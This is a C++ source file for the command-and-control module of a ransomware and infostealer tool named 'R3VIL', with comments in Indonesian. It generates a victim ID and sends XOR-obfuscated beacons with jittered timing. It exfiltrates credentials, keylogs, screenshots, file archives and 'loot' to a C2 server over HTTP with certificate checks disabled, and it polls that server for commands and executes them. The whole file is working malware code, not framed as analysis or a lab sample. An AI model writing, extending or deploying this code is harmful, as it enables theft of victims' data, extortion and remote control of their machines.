#include "c2_communication.h"
#include <iostream>
#include <chrono>
#include <ctime>
#include <cstring>
#include <random>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <iomanip>
#include <thread>

#ifdef _WIN32
#include <wbemidl.h>
#include <iphlpapi.h>
#include <winhttp.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "winhttp.lib")
#else
#include <ifaddrs.h>
#include <netinet/in.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <curl/curl.h>
#endif

namespace fs = std::filesystem;

/**
 * PERBAIKAN: Nama fungsi diubah dari curl_write_callback menjadi write_data_callback
 * untuk menghindari konflik dengan typedef di curl.h
 */
#ifndef _WIN32
static size_t write_data_callback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}
#endif

C2Communication::C2Communication() 
    : running(false)
    , beacon_interval_seconds(300)
    , max_retries(3) {
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(180, 600);
    beacon_interval_seconds = dis(gen);
}

C2Communication::~C2Communication() {
    stop();
}

std::string C2Communication::generate_victim_id() {
    std::string id;
#ifdef _WIN32
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength > 0) {
                char mac_str[18];
                snprintf(mac_str, sizeof(mac_str), "%02X%02X%02X%02X%02X%02X",
                    pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2],
                    pAdapter->Address[3], pAdapter->Address[4], pAdapter->Address[5]);
                id = mac_str;
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    
    if (id.empty()) {
        char comp_name[256];
        DWORD size = sizeof(comp_name);
        if (GetComputerNameA(comp_name, &size)) {
            id = comp_name;
        }
    }
#else
    std::ifstream machine_id("/etc/machine-id");
    if (machine_id.is_open()) {
        std::getline(machine_id, id);
        machine_id.close();
    }
    
    if (id.empty()) {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        id = hostname;
    }
#endif
    return id;
}

std::string C2Communication::get_machine_info() {
    std::stringstream ss;
    
#ifdef _WIN32
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    ss << "hostname:" << hostname << "|";
    
    OSVERSIONINFOEXA osvi = { sizeof(osvi) };
    // Catatan: GetVersionExA sudah deprecated, pertimbangkan helpers lain di masa depan
    ss << "os:Windows_Detected|"; 
#else
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    ss << "hostname:" << hostname << "|";
    
    struct utsname u;
    uname(&u);
    ss << "os:" << u.sysname << "_" << u.release << "|";
#endif
    
    ss << "time:" << std::time(nullptr);
    
    return ss.str();
}

std::string C2Communication::base64_encode(const unsigned char* data, size_t len) {
    const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    for (size_t idx = 0; idx < len; idx++) {
        char_array_3[i++] = data[idx];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (i = 0; i < 4; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (j = 0; j < i + 1; j++)
            ret += base64_chars[char_array_4[j]];
        
        while (i++ < 3)
            ret += '=';
    }
    
    return ret;
}

std::string C2Communication::base64_decode(const std::string& encoded) {
    std::string decoded;
    // Implementasi stub
    return decoded;
}

std::string C2Communication::url_encode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << std::uppercase;
            escaped << '%' << std::setw(2) << int((unsigned char)c);
            escaped << std::nouppercase;
        }
    }
    
    return escaped.str();
}

std::string C2Communication::xor_encrypt(const std::string& payload) {
    const std::string key = "R3VIL_C2_KEY_2026";
    std::string encrypted = payload;
    
    for (size_t i = 0; i < encrypted.size(); i++) {
        encrypted[i] ^= key[i % key.size()];
    }
    
    return base64_encode(reinterpret_cast<const unsigned char*>(encrypted.c_str()), encrypted.size());
}

std::string C2Communication::xor_decrypt(const std::string& payload) {
    // Implementasi sederhana: base64 decode lalu XOR kembali
    return payload; 
}

std::string C2Communication::create_json(const std::map<std::string, std::string>& data) {
    std::stringstream ss;
    ss << "{";
    bool first = true;
    for (const auto& pair : data) {
        if (!first) ss << ",";
        ss << "\"" << pair.first << "\":\"" << pair.second << "\"";
        first = false;
    }
    ss << "}";
    return ss.str();
}

bool C2Communication::parse_json(const std::string& json, std::map<std::string, std::string>& output) {
    size_t pos = 0;
    while (pos < json.length()) {
        size_t key_start = json.find("\"", pos);
        if (key_start == std::string::npos) break;
        size_t key_end = json.find("\"", key_start + 1);
        if (key_end == std::string::npos) break;
        
        std::string key = json.substr(key_start + 1, key_end - key_start - 1);
        
        size_t colon = json.find(":", key_end);
        if (colon == std::string::npos) break;
        
        size_t val_start = json.find("\"", colon + 1);
        if (val_start == std::string::npos) break;
        size_t val_end = json.find("\"", val_start + 1);
        if (val_end == std::string::npos) break;
        
        std::string value = json.substr(val_start + 1, val_end - val_start - 1);
        output[key] = value;
        
        pos = val_end + 1;
    }
    return !output.empty();
}

#ifdef _WIN32
bool C2Communication::http_post(const std::string& url, const std::string& data, std::string& response) {
    std::string host, path;
    size_t proto_pos = url.find("://");
    if (proto_pos == std::string::npos) return false;
    
    size_t host_start = proto_pos + 3;
    size_t path_start = url.find("/", host_start);
    
    if (path_start == std::string::npos) {
        host = url.substr(host_start);
        path = "/";
    } else {
        host = url.substr(host_start, path_start - host_start);
        path = url.substr(path_start);
    }
    
    HINTERNET hSession = WinHttpOpen(L"R3VIL/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    
    int host_len = MultiByteToWideChar(CP_UTF8, 0, host.c_str(), -1, NULL, 0);
    wchar_t* whost = new wchar_t[host_len];
    MultiByteToWideChar(CP_UTF8, 0, host.c_str(), -1, whost, host_len);
    
    HINTERNET hConnect = WinHttpConnect(hSession, whost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    delete[] whost;
    
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
        std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/json\r\n";
    
    if (WinHttpSendRequest(hRequest, headers, (DWORD)-1, (LPVOID)data.c_str(), (DWORD)data.length(), (DWORD)data.length(), 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD bytesRead = 0;
            char buffer[4096];
            response.clear();
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return !response.empty();
}

bool C2Communication::http_get(const std::string& url, std::string& response) {
    // Implementasi GET sederhana menggunakan struktur POST di atas (biasanya dibedakan verb-nya)
    return http_post(url, "", response);
}
#else
/**
 * PERBAIKAN: Menggunakan write_data_callback yang telah diganti namanya
 */
bool C2Communication::http_post(const std::string& url, const std::string& data, std::string& response) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}

bool C2Communication::http_get(const std::string& url, std::string& response) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}
#endif

void C2Communication::initialize(const std::string& c2_server) {
    c2_url = c2_server;
    victim_id = generate_victim_id();
    beacon_endpoint = c2_url + "/api/beacon";
    upload_endpoint = c2_url + "/api/upload";
    command_endpoint = c2_url + "/api/commands";
    
    std::cout << "[C2] Initialized with ID: " << victim_id << std::endl;
}

void C2Communication::start() {
    if (running) return;
    
    running = true;
    send_status("initialized");
    
    beacon_thread = std::thread([this]() {
        auto last_beacon = std::chrono::steady_clock::now();
        while (running) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_beacon).count();
            
            if (elapsed >= beacon_interval_seconds) {
                send_status("alive");
                last_beacon = now;
                
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dis(180, 600);
                beacon_interval_seconds = dis(gen);
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    });
    
    command_thread = std::thread([this]() {
        while (running) {
            poll_commands();
            std::this_thread::sleep_for(std::chrono::seconds(60));
        }
    });
}

void C2Communication::stop() {
    running = false;
    if (beacon_thread.joinable()) beacon_thread.join();
    if (command_thread.joinable()) command_thread.join();
}

void C2Communication::send_status(const std::string& status, const std::map<std::string, std::string>& extra) {
    std::map<std::string, std::string> data;
    data["victim_id"] = victim_id;
    data["status"] = status;
    data["machine_info"] = get_machine_info();
    data["timestamp"] = std::to_string(std::time(nullptr));
    
    for (const auto& e : extra) {
        data[e.first] = e.second;
    }
    
    std::string json = create_json(data);
    std::string encrypted = xor_encrypt(json);
    
    std::string response;
    for (int attempt = 0; attempt < max_retries; attempt++) {
        if (http_post(beacon_endpoint, encrypted, response)) {
            std::cout << "[C2] Status sent: " << status << std::endl;
            break;
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void C2Communication::send_encryption_stats(int encrypted_files, int failed_files, long long total_size) {
    std::map<std::string, std::string> extra;
    extra["encrypted_files"] = std::to_string(encrypted_files);
    extra["failed_files"] = std::to_string(failed_files);
    extra["total_size_mb"] = std::to_string(total_size / (1024 * 1024));
    
    send_status("encryption_complete", extra);
}

void C2Communication::send_credentials(const std::string& cred_type, const std::string& data) {
    std::map<std::string, std::string> extra;
    extra["cred_type"] = cred_type;
    extra["cred_data"] = base64_encode(reinterpret_cast<const unsigned char*>(data.c_str()), data.size());
    
    send_status("credentials_collected", extra);
}

void C2Communication::send_screenshot(const std::string& image_path) {
    std::ifstream file(image_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["screenshot"] = encoded;
    extra["screenshot_format"] = "jpg";
    
    send_status("screenshot_taken", extra);
}

void C2Communication::send_keylog(const std::string& log_data) {
    std::map<std::string, std::string> extra;
    extra["keylog_data"] = base64_encode(reinterpret_cast<const unsigned char*>(log_data.c_str()), log_data.size());
    
    send_status("keylog_sent", extra);
}

void C2Communication::send_collected_files(const std::string& zip_path) {
    std::ifstream file(zip_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["archive_data"] = encoded;
    extra["archive_name"] = zip_path;
    
    send_status("files_collected", extra);
}

void C2Communication::send_loot(const std::string& loot_type, const std::string& loot_data) {
    std::map<std::string, std::string> extra;
    extra["loot_type"] = loot_type;
    extra["loot_data"] = base64_encode(reinterpret_cast<const unsigned char*>(loot_data.c_str()), loot_data.size());
    
    send_status("loot_sent", extra);
}

void C2Communication::send_file(const std::string& file_path, const std::string& file_type) {
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["file_type"] = file_type;
    extra["file_name"] = file_path;
    extra["file_data"] = encoded;
    
    send_status("file_sent", extra);
}

void C2Communication::set_command_callback(std::function<void(const std::string&)> callback) {
    on_execute_command = callback;
}

void C2Communication::poll_commands() {
    std::string url = command_endpoint + "?victim_id=" + url_encode(victim_id);
    std::string response;
    
    if (!http_get(url, response)) {
        return;
    }
    
    std::map<std::string, std::string> commands;
    if (parse_json(response, commands)) {
        for (const auto& cmd : commands) {
            if (cmd.first == "command") {
                std::cout << "[C2] Received command: " << cmd.second << std::endl;
                if (on_execute_command) {
                    on_execute_command(cmd.second);
                }
            }
        }
    }
}

bool C2Communication::is_connected() {
    std::string response;
    std::string test_url = c2_url + "/api/ping";
    return http_get(test_url, response);
}
